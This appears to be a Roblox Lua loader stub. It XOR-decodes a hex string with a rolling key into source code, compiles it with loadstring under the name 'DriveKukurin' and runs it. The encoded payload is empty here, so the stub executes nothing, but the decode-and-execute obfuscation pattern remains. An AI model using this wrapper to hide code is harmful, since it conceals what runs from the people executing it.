local p = ""
local k, t = 157, table.create(#p / 2)
for i = 1, #p, 2 do
    local b = bit32.bxor(tonumber(string.sub(p, i, i + 1), 16), k)
    t[(i + 1) / 2] = string.char(b)
    k = (73 * k + 41 + b) % 256
end
local run, err = loadstring(table.concat(t), "=DriveKukurin")
assert(run, err)
return run()
